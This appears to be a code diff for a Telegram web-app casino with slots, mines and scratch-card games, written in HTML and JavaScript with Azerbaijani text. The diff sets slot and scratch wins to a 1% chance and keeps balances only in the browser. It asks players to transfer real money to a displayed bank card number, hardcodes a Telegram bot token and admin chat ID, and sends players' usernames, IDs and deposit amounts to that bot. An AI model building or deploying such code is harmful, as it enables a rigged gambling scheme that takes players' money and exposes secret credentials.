@@ -36,15 +36,13 @@
     .bet-btn { flex: 1; padding: 6px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 8px; font-weight: bold; cursor: pointer; }
     .bet-btn.active { border-color: var(--accent-gold); color: var(--accent-gold); background: rgba(255,215,0,0.1); }
 
-    /* 4-lü Slot */
     .slots-container { display: flex; gap: 6px; margin: 20px 0; width: 100%; justify-content: center; }
     .slot { width: 70px; height: 90px; background: #0a0814; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 34px; border: 2px solid var(--accent-gold); }
 
-    /* Mines Options */
     .mines-config { width: 100%; margin-bottom: 10px; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; }
-    .mine-count-btns { display: flex; gap: 5px; margin-top: 5px; }
-    .mine-count-btn { flex: 1; padding: 5px; background: #0a0814; border: 1px solid #444; color: #fff; border-radius: 6px; font-size: 12px; cursor: pointer; }
-    .mine-count-btn.active { border-color: var(--accent-gold); color: var(--accent-gold); }
+    .mine-count-btns { display: flex; gap: 4px; margin-top: 5px; flex-wrap: wrap; justify-content: center; }
+    .mine-count-btn { flex: 1; min-width: 50px; padding: 6px 2px; background: #0a0814; border: 1px solid #444; color: #fff; border-radius: 6px; font-size: 11px; cursor: pointer; }
+    .mine-count-btn.active { border-color: var(--accent-gold); color: var(--accent-gold); background: rgba(255,215,0,0.15); }
 
     .mines-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; width: 100%; margin: 15px 0; }
     .mine-card { aspect-ratio: 1; background: #0a0814; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: 0.2s; }
@@ -89,7 +87,7 @@
     </div>
   </div>
 
-  <!-- 4-LÜ MEYVƏ SLOTI -->
+  <!-- 4-LÜ MEYVƏ SLOTU -->
   <div class="view active" id="slotsView">
     <div class="slots-container">
       <div class="slot" id="slot1">🍎</div>
@@ -101,11 +99,12 @@
     <div class="status-msg" id="slotsStatus"></div>
   </div>
 
-  <!-- MİNA OYUNU (Mina Sayı Seçimi İlə) -->
+  <!-- MİNA OYUNU -->
   <div class="view" id="minesView">
     <div class="mines-config" id="minesConfigBox">
-      <div style="font-size:12px; color:#aaa; margin-bottom:4px;">MİNA SAYINI SEÇİN:</div>
+      <div style="font-size:12px; color:#aaa; margin-bottom:4px;">MİNA SAYINI SEÇİN (1 - 20):</div>
       <div class="mine-count-btns">
+        <button class="mine-count-btn" onclick="selectMinesCount(1, this)">1 Mina</button>
         <button class="mine-count-btn" onclick="selectMinesCount(3, this)">3 Mina</button>
         <button class="mine-count-btn active" onclick="selectMinesCount(5, this)">5 Mina</button>
         <button class="mine-count-btn" onclick="selectMinesCount(10, this)">10 Mina</button>
@@ -133,7 +132,7 @@
 
     <div class="deposit-card-box">
       <div style="font-size:12px; color:#888;">ÖDƏNİŞ KARTI (AZN):</div>
-      <div class="card-number-display" id="myCardNum">4127 0000 0000 0000</div>
+      <div class="card-number-display" id="myCardNum">4169 7388 7894 8672</div>
       <button class="copy-btn" onclick="copyCard()">KART NÖMRƏSİNİ KOPYALA</button>
     </div>
 
@@ -147,6 +146,10 @@
   <script>
     const tg = window.Telegram?.WebApp;
     if(tg) tg.expand();
+
+    // DƏXİL ETDİYİNİZ BOT TOKEN VƏ CHAT ID
+    const BOT_TOKEN = "8836417399:AAGzWfJyIHiQMNuO1VhGrYU65wjf7eUqLsk";
+    const ADMIN_CHAT_ID = "7723256649";
 
     const AudioCtx = window.AudioContext || window.webkitAudioContext;
     const audioCtx = new AudioCtx();
@@ -240,20 +243,20 @@
       let count = 0;
       const timer = setInterval(() => {
         let r1, r2, r3, r4;
-        const winChance = Math.random(); // 1% Uduş Şansı
+        const winChance = Math.random();
         
         if (count > 12) {
           clearInterval(timer);
           spinBtn.disabled = false;
 
-          if (winChance <= 0.01) { // 1% UDUŞ (4 EYNİ MEYVƏ)
+          if (winChance <= 0.01) {
             const sym = fruitItems[Math.floor(Math.random() * fruitItems.length)];
             r1 = r2 = r3 = r4 = sym;
-            const win = currentBet * 25; // 4-lü dü düşdükdə 25x Əmsal
+            const win = currentBet * 25;
             balance += win;
             playSound('win');
             document.getElementById('slotsStatus').innerText = `BÖYÜK CEKPOT! +${win.toFixed(2)} AZN! 🎉`;
-          } else { // 99% UDUZMAQ
+          } else {
             r1 = fruitItems[Math.floor(Math.random() * fruitItems.length)];
             r2 = fruitItems[Math.floor(Math.random() * fruitItems.length)];
             r3 = fruitItems[Math.floor(Math.random() * fruitItems.length)];
@@ -280,7 +283,7 @@
       }, 80);
     }
 
-    // --- MİNA OYUNU (Dinamik Əmsal Və Məbləğ Hesablaması) ---
+    // --- MİNA OYUNU ---
     let minesState = { active: false, bombs: [], openedCount: 0, multiplier: 1.0 };
     
     function initMinesGrid() {
@@ -315,7 +318,6 @@
 
       minesState = { active: true, bombs: [], openedCount: 0, multiplier: 1.0 };
       
-      // Seçilən mina sayına görə bombaları yerləşdiririk
       while(minesState.bombs.length < selectedMinesCount) {
         let r = Math.floor(Math.random() * 25);
         if(!minesState.bombs.includes(r)) minesState.bombs.push(r);
@@ -341,7 +343,6 @@
         playSound('click');
         minesState.openedCount++;
         
-        // Əmsal Mina Sayına Mütənasib Olaraq Artır (Çox mina = Yüksək əmsal)
         const stepMultiplier = 1 + (selectedMinesCount * 0.12);
         minesState.multiplier *= stepMultiplier;
 
@@ -370,7 +371,7 @@
       scratchItems = [];
       revealedScratch = 0;
 
-      const isWin = Math.random() <= 0.01; // 1% Uduş Ehtimalı
+      const isWin = Math.random() <= 0.01;
 
       if (isWin) {
         const winSym = fruitItems[Math.floor(Math.random() * fruitItems.length)];
@@ -441,13 +442,32 @@
 
       const user = tg?.initDataUnsafe?.user;
       const username = user ? `@${user.username || user.first_name}` : 'İstifadəçi';
+      const userId = user ? user.id : 'Məlum deyil';
 
-      if(tg && tg.sendData) {
-        tg.sendData(JSON.stringify({ type: 'deposit', amount: amount, user: username }));
-      }
+      const messageText = `💳 <b>YENİ DEPOZİT SORĞUSU</b>\n\n👤 <b>İstifadəçi:</b> ${username}\n🆔 <b>User ID:</b> <code>${userId}</code>\n💰 <b>Məbləğ:</b> ${amount} AZN`;
 
-      document.getElementById('depStatus').innerText = `Məlumat adminə göndərildi! Pulu kart hesabına köçürdünüzsə, az sonra balansınız əlavə olunacaq.`;
-      playSound('win');
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: ADMIN_CHAT_ID,
+          text: messageText,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if(data.ok) {
+          document.getElementById('depStatus').innerText = `Məlumat adminə göndərildi! Pulu kart hesabına köçürdünüzsə, az sonra balansınız əlavə olunacaq.`;
+          playSound('win');
+        } else {
+          alert('Xəta! Bot əmri çatmadı. Lütfən Telegram-da botunuza daxil olub /start düyməsini basın.');
+        }
+      })
+      .catch(err => {
+        document.getElementById('depStatus').innerText = `Şəbəkə xətası baş verdi!`;
+        playSound('lose');
+      });
     }
   </script>
 </body>
